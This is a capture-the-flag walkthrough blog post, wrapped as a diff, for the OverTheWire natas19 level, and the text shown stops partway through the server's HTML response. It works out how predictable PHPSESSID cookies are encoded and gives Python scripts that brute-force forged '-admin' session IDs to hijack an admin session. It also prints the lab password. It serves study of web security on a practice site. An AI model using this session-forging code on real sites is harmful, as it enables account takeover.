@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Natas Challenges (part 4) - noopz</title><meta name="Description" content="The fourth in a multi-part walkthrough for the OverTheWire natas levels."><meta property="og:title" content="Natas Challenges (part 4)" />
+<meta property="og:description" content="The fourth in a multi-part walkthrough for the OverTheWire natas levels." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://noopz.github.io/natas_challenges_part4/" />
+<meta property="og:image" content="https://noopz.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-06-20T18:26:53+00:00" />
+<meta property="article:modified_time" content="2020-06-21T11:05:20-07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Natas Challenges (part 4)"/>
+<meta name="twitter:description" content="The fourth in a multi-part walkthrough for the OverTheWire natas levels."/>
+<meta name="application-name" content="noopz">
+<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/natas_challenges_part4/" /><link rel="prev" href="https://noopz.github.io/natas_challenges_part3/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Natas Challenges (part 4)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/noopz.github.io\/natas_challenges_part4\/"
+        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, natas, wargames","wordcount":  2722 ,
+        "url": "https:\/\/noopz.github.io\/natas_challenges_part4\/","datePublished": "2020-06-20T18:26:53+00:00","dateModified": "2020-06-21T11:05:20-07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "The fourth in a multi-part walkthrough for the OverTheWire natas levels."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Natas Challenges (part 4)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-20">2020-06-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2722 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#natas19">natas19</a></li>
+    <li><a href="#natas20">natas20</a></li>
+    <li><a href="#natas21">natas21</a></li>
+    <li><a href="#natas22">natas22</a></li>
+    <li><a href="#natas23">natas23</a></li>
+    <li><a href="#natas24">natas24</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Part 4 of the natas OverTheWireChallenges, this post covers solutions for levels 19 through 24.</p>
+<ul>
+<li>Part 1 can be found <a href="https://noopz.github.io/natas_challenges_part1/" rel="">here</a></li>
+<li>Part 2 can be found <a href="https://noopz.github.io/natas_challenges_part2/" rel="">here</a></li>
+<li>Part 3 can be found <a href="https://noopz.github.io/natas_challenges_part3/" rel="">here</a></li>
+</ul>
+<h2 id="natas19">natas19</h2>
+<p>Starting this off by going to: <a href="http://natas19.natas.labs.overthewire.org/">http://natas19.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas19
+Pass: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+</code></pre></td></tr></table>
+</div>
+</div><p>The only hint this time around is that the code uses largely the same code as the previous challenge, except that the &ldquo;session IDs are not longer sequential&rdquo; (and happen to be extremely large values, too large to just brute force 0 to n).</p>
+<p>One of the important things to note now, there&rsquo;s no longer a view source button. Seems the difficult has ramped up quite a bit here, so it&rsquo;ll be time to leverage everything learned from the first 19 challenge sto try and solve this.</p>
+<p>Putting in <code>admin:aa</code>, greeted with a &ldquo;log in as admin for password&rdquo;. Using the DevTools the traffic doesn&rsquo;t show anything out of the ordinary or something that could possibly be used to get past this challenge. Next stop is the cookies, just like the previous challenge the <code>PHPSESSID</code> is saved in the cookies.</p>
+<p>Trying some quick combinations of different <code>username:password</code> combinations and then looking at the <code>PHPSESSID</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">    <span class="n">A</span><span class="o">:</span><span class="n">a</span> <span class="o">=</span> <span class="m">3532322</span><span class="n">d41</span>
+    <span class="n">A</span><span class="o">:</span><span class="n">a</span> <span class="o">=</span> <span class="m">3231362</span><span class="n">d41</span>
+    <span class="n">A</span><span class="o">:</span><span class="n">a</span> <span class="o">=</span> <span class="m">3239372</span><span class="n">d41</span>
+    <span class="n">A</span><span class="o">:</span><span class="n">a</span> <span class="o">=</span> <span class="m">3631332</span><span class="n">d41</span>
+    <span class="n">A</span><span class="o">:</span><span class="n">b</span> <span class="o">=</span> <span class="m">3538342</span><span class="n">d41</span>
+    <span class="n">AA</span><span class="o">:</span><span class="n">a</span> <span class="o">=</span><span class="m">3136372</span><span class="n">d4141</span>
+    <span class="n">b</span><span class="o">:</span><span class="n">a</span> <span class="o">=</span> <span class="m">3535302</span><span class="n">d62</span>
+    <span class="n">b</span><span class="o">:</span><span class="n">b</span> <span class="o">=</span> <span class="m">3130322</span><span class="n">d62</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Something interesting here is that it looks like the username is tacked on the end after converting to ASCII (<code>A</code> = <code>0x41</code>, <code>b</code> = <code>0x62</code>). This can be confirmed with a bunch of A&rsquo;s:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">    <span class="n">AAAAAAAA</span><span class="o">:</span> <span class="m">3136372</span><span class="n">d4141414141414141</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now to determine what the <code>2d</code> as it precedes all of the usernames regardless of what the input seems to be. A quick look in the <a href="http://www.asciitable.com/" target="_blank" rel="noopener noreffer">ASCII table</a>, show&rsquo;s that 2D is a &ldquo;hyphen&rdquo;, <code>-</code>.</p>
+<p>So far we know:
+<code>&lt;Unknown&gt;-&lt;username&gt;</code></p>
+<p>Now to figure out the last of the unknowns, grabbing a bunch of data:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">     <span class="m">3439362</span><span class="n">d4141414141414141</span>
+     <span class="m">3436312</span><span class="n">d4141414141414141</span>
+     <span class="m">3231302</span><span class="n">d4141414141414141</span>
+     <span class="m">3334312</span><span class="n">d4141414141414141</span>
+     <span class="m">3332372</span><span class="n">d4141414141414141</span>
+     <span class="m">3532392</span><span class="n">d4141414141414141</span>
+     <span class="m">35392</span><span class="n">d4141414141414141</span>
+     <span class="m">3633382</span><span class="n">d4141414141414141</span>
+     <span class="m">3335332</span><span class="n">d4141414141414141</span>
+     <span class="m">3438372</span><span class="n">d4141414141414141</span>
+     <span class="m">3533372</span><span class="n">d4141414141414141</span>
+     <span class="m">3332312</span><span class="n">d4141414141414141</span>
+     <span class="m">3136382</span><span class="n">d4141414141414141</span>
+     <span class="m">38322</span><span class="n">d4141414141414141</span>
+     <span class="m">3533322</span><span class="n">d41</span>
+     <span class="m">3437342</span><span class="n">d41</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>At this point it&rsquo;s obvious collecting this data by hand isn&rsquo;t the best way to do something a computer can do significantly faster. So some real quick and dirty python will grab a whole bunch of data:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://natas19.natas.labs.overthewire.org/index.php?debug&#34;</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s2">&#34;natas19&#34;</span>
+<span class="n">PASSW</span> <span class="o">=</span> <span class="s2">&#34;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#34;</span>
+<span class="n">NUM_ITERATIONS</span> <span class="o">=</span> <span class="mi">200</span>
+<span class="n">POOL</span> <span class="o">=</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">build_requests</span><span class="p">():</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">NUM_ITERATIONS</span><span class="p">):</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">}</span>
+        <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="n">USER</span><span class="p">,</span> <span class="n">PASSW</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;auth&#34;</span><span class="p">:</span> <span class="n">auth</span><span class="p">,</span> <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="n">params</span><span class="p">})</span>
+    <span class="k">return</span> <span class="n">req</span>
+<span class="k">def</span> <span class="nf">request_sessions</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;auth&#34;</span><span class="p">],</span>
+    <span class="n">params</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;params&#34;</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">res</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">urls</span> <span class="o">=</span> <span class="n">build_requests</span><span class="p">()</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">POOL</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">request_sessions</span><span class="p">,</span> <span class="n">urls</span><span class="p">)</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">cookie</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">dict_from_cookiejar</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">cookies</span><span class="p">)[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">]</span>
+        <span class="c1"># Separate everything into two chunks knowing that 2d is a separator</span>
+        <span class="n">head</span> <span class="o">=</span> <span class="n">cookie</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">cookies</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">head</span><span class="p">))</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cookies</span><span class="p">:</span>
+        <span class="c1"># Break the output up into chunks of two characters at a time</span>
+        <span class="k">print</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)),</span> <span class="mi">2</span><span class="p">)])</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Which results in the following output:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;30&#39;</span><span class="p">,</span> <span class="s">&#39;34&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;35&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;36&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;38&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;32&#39;</span><span class="p">,</span> <span class="s">&#39;33&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;32&#39;</span><span class="p">,</span> <span class="s">&#39;34&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;32&#39;</span><span class="p">,</span> <span class="s">&#39;34&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;32&#39;</span><span class="p">,</span> <span class="s">&#39;39&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;32&#39;</span><span class="p">,</span> <span class="s">&#39;39&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;33&#39;</span><span class="p">,</span> <span class="s">&#39;38&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;34&#39;</span><span class="p">,</span> <span class="s">&#39;39&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;35&#39;</span><span class="p">,</span> <span class="s">&#39;30&#39;</span><span class="n">]</span>
+    <span class="n">[</span><span class="s">&#39;31&#39;</span><span class="p">,</span> <span class="s">&#39;35&#39;</span><span class="p">,</span> <span class="s">&#39;34&#39;</span><span class="n">]</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So it seems that the data is always a number that starts with <code>3</code>. Well since the username was just the hexadecimal representation of the username, it&rsquo;s likely these also correspond to some sort of ASCII value. Looking at the ASCII table again, it looks like this corresponds to 0-9.</p>
+<p>So the ID the ASCII representation of the following:
+<code>&lt;num&gt;&lt;num&gt;&lt;num&gt;-&lt;username&gt;</code></p>
+<p>Which means we&rsquo;ve got 0 to 999 possible session IDs to work though. Sounds like a perfect case to use the parallelized version of <code>natas18</code>'s python script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://natas19.natas.labs.overthewire.org/index.php?debug&#34;</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s2">&#34;natas19&#34;</span>
+<span class="n">PASSW</span> <span class="o">=</span> <span class="s2">&#34;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#34;</span>
+<span class="n">NUM_ITERATIONS</span> <span class="o">=</span> <span class="mi">999</span>
+<span class="n">POOL</span> <span class="o">=</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">build_requests</span><span class="p">():</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">admin_tag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">&#39;-admin&#39;</span><span class="p">])</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">NUM_ITERATIONS</span><span class="p">):</span>
+        <span class="nb">id</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="n">j</span><span class="p">:</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">]))</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="mi">1</span><span class="p">)])</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">}</span>
+        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="nb">id</span> <span class="o">+</span> <span class="n">admin_tag</span><span class="p">}</span>
+        <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="n">USER</span><span class="p">,</span> <span class="n">PASSW</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;auth&#34;</span><span class="p">:</span> <span class="n">auth</span><span class="p">,</span> <span class="s2">&#34;cookies&#34;</span><span class="p">:</span> <span class="n">cookies</span><span class="p">,</span> <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="n">params</span><span class="p">})</span>
+    <span class="k">return</span> <span class="n">req</span>
+<span class="k">def</span> <span class="nf">request_sessions</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;auth&#34;</span><span class="p">],</span>
+    <span class="n">cookies</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;cookies&#34;</span><span class="p">],</span> <span class="n">params</span><span class="o">=</span><span class="n">req</span><span class="p">[</span><span class="s2">&#34;params&#34;</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">res</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">urls</span> <span class="o">=</span> <span class="n">build_requests</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">urls</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">POOL</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">request_sessions</span><span class="p">,</span> <span class="n">urls</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s2">&#34;You are an admin.&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And here we have our admin session:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
